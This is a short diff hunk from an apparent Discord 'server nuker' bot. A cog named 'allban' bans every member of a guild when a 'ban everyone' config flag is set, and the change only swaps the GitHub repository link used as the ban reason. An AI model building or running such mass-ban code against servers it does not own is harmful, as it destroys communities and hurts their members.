@@ -25,7 +25,7 @@ class allban(commands.Cog):
                 for user in list(message.guild.members):
                     try:
                         if config["required"]["herkesibanla"]:
-                            await user.ban(reason="https://github.com/CryonicsX/sunucupatlat.exe")
+                            await user.ban(reason="https://github.com/CryonicsX/Guild_Boomber")
                     except discord.Forbidden:
                         continue
                     except Exception as e:
